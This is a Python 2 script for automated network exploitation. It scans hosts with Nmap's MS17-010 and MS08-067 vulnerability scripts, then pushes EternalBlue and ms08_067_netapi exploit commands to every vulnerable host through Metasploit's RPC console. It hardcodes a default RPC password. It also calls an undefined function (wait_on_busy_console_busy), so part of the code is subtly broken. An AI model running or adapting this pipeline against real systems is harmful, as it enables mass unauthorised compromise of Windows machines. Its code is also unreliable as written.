#!/usr/bin/env python2

import os
import sys
import time
import msfrpc
import argparse
import netifaces
from IPython import embed
from termcolor import colored
from threading import Thread, Lock
from libnmap.process import NmapProcess
from netaddr import IPNetwork, AddrFormatError
from subprocess import Popen, PIPE, CalledProcessError
from libnmap.parser import NmapParser, NmapParserException

CLIENT = msfrpc.Msfrpc({})

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-p", "--password", default='Au70PwN', help="Password for msfrpc")
    parser.add_argument("-u", "--username", default='msf', help="Username for msfrpc")
    parser.add_argument("-x", "--xml", help="Nmap XML file")
    parser.add_argument("--port", default=55552, type=int, help="Port for msfrpc")
    return parser.parse_args()

# Colored terminal output
def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

def print_great(msg):
    print(colored('[!] {}'.format(msg), 'yellow', attrs=['bold']))

def keep_alive(args, lock):
    '''
    msfrpc will kill auth tokens after 5m
    '''
    global CLIENT

    last_check = time.time()
    while True:
        if time.time() - last_check > 100:
            with lock:
                CLIENT.login(args.username, args.password)
        time.sleep(1)

def run_proc(cmd):
    '''
    Runs single commands
    '''
    cmd_split = cmd.split()
    print_info('Running: {}'.format(cmd))
    proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)

    return proc

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except IOError:
            print_bad('Host file not found: {}'.format(args.xml))
            sys.exit()

    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        print_bad('CIDR notation only in the host list, e.g. 10.0.0.0/24')
                        sys.exit()
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    print_bad('Error importing host list file. Are you sure you chose the right file?')
                    sys.exit()

        report = nmap_scan(hosts)

    else:
        print_bad('Specify hostlist with: -l <hostlist.txt>')
        sys.exit()

    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    #nmap_args = '-sS -T4 -sV -n --max-retries 5 -oA autopwn-scan'
    nmap_args = '-sS -T4 -sV -n --max-retries 5 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA autopwn-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/autopwn-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print_info("Nmap running: {} min".format(str(x)))

        time.sleep(1)

def get_hosts(report):
    '''
    Gets list of hosts with port 445 or 3268 (to find the DC) open
    and a list of hosts with smb signing disabled
    '''
    hosts = {}

    print_info('Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            ip = host.address
            print_info('Host up: {}'.format(ip))
            for s in host.services:
                if s.open():
                    if 'product: ' in s.banner:
                        banner = s.banner.split('product: ')[1]
                    else:
                        banner = s.banner
                    port = str(s.port)
                    print '          {} - {}'.format(port, banner)
                    port_banner = [(port, banner)]
                    if hosts.get(ip):
                        hosts[ip] += port_banner
                    else:
                        hosts[ip] = port_banner

    if len(hosts) == 0:
        print_bad('No hosts found')
        sys.exit()

    return hosts

def get_smb_vuln_hosts(report):
    '''
    Parse NSE scripts to find vulnerable hosts
    '''
    vuln_hosts = {}
    nse_scripts = ['smb-vuln-ms17-010', 'smb-vuln-ms08-067']

    for host in report.hosts:
        ip = host.address

        for script_out in host.scripts_results:
            for script in nse_scripts:
                if script_out['id'] == script:
                    if 'State: VULNERABLE' in script_out['output']:
                        print_good('NSE script {} found vulnerable host: {}'.format(script, ip))
                        if vuln_hosts.get(ip):
                            vuln_hosts[ip].append(script)
                        else:
                            vuln_hosts[ip] = [script]

    return vuln_hosts

def get_smb_cmds(smb_vuln_hosts):
    all_ms17_cmds = []
    all_ms08_cmds = []

    port = '445'

    ms17_path = 'exploit/windows/smb/ms17_010_eternalblue'
    ms17_rhost_var = 'RHOST'
    ms17_opts = 'set MaxExploitAttempts 6\n'


    ms08_path = 'exploit/windows/smb/ms08_067_netapi'
    ms08_rhost_var = 'RHOST'

    for ip in smb_vuln_hosts:
        for script in smb_vuln_hosts[ip]:
            if script == 'smb-vuln-ms17-010':
                ms17_cmd = create_msf_cmd(ms17_path, ms17_rhost_var, ip, port, ms17_opts)
                all_ms17_cmds.append(ms17_cmd)
            elif script == 'smb-vuln-ms08-067':
                ms08_cmd = create_msf_cmd(ms08_path, ms08_rhost_var, ip, port, '')
                all_ms08_cmds.append(ms08_cmd)

    return all_ms17_cmds, all_ms08_cmds

def create_msf_cmd(exploit_path, rhost_var, ip, port, extra_opts):
    '''
    1. exploit path
    2. RHOST/RHOSTS
    3. IP
    4. port
    5. extra options
    '''
    cmds = """
           use {}\n
           set {} {}\n
           set PORT {}\n
           {}
           set ExitOnSession True
           exploit -z\n
           """.format(exploit_path, rhost_var, ip, port, extra_opts)

    return cmds

def wait_on_busy_console(c_id):
    '''
    The only way to get console busy status is through console.read or console.list
    console.read clears the output buffer so you gotta use console.list
    but console.list requires you know the list offset of the c_id console
    so this ridiculous list comprehension seems necessary to avoid assuming
    what the right list offset might be
    '''
    list_offset = [x['id'] for x in CLIENT.call('console.list')['consoles'] if x['id'] is c_id][0]
    while CLIENT.call('console.list')[list_offset]['busy'] == True:
        time.sleep(1)

def exploit_smb(c_id, smb_vuln_hosts):
    '''
    Exploits ms08-067 and ms17-010
    '''
    ms17_cmds, ms08_cmds = get_smb_cmds(smb_vuln_hosts)

    if len(ms17_cmds) > 0:
        for cmd in ms17_cmds:
            wait_on_busy_console_busy(c_id)
            CLIENT.call('console.write',[c_id, cmd])

    if len(ms08_cmds) > 0:
        for cmd in ms08_cmds:
            wait_on_busy_console(c_id)
            CLIENT.call('console.write',[c_id, cmd])

def main(report, args):
    global CLIENT

    lock = Lock()

    # hosts will only be populated with ips that have open ports
    # hosts = {ip : [(port, banner), (port2, banner2)]
    hosts = get_hosts(report)

    # initialize keep alive process
    # won't attempt first login until 100s from start
    p = Thread(target=keep_alive, args=(args, lock))
    p.setDaemon(True)
    p.start()

    CLIENT.login(args.username, args.password)

    c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]

    if len(c_ids) == 0:
        CLIENT.call('console.create')
        c_ids = [x['id'] for x in CLIENT.call('console.list')['consoles']]

    # Get the latest console
    c_id = c_ids[-1]

    #Exploit ms08/17
    # these are in format {ip:[ms08-nse, ms17-nse]}
    smb_vuln_hosts = get_smb_vuln_hosts(report)
    exploit_smb(c_id, smb_vuln_hosts)

    embed()

if __name__ == "__main__":
    args = parse_args()
    if os.geteuid():
        print_bad('Run as root')
        sys.exit()
    report = parse_nmap(args)
    main(report, args)

#TODO
# implement payload search via module.payload rather than manually setting them
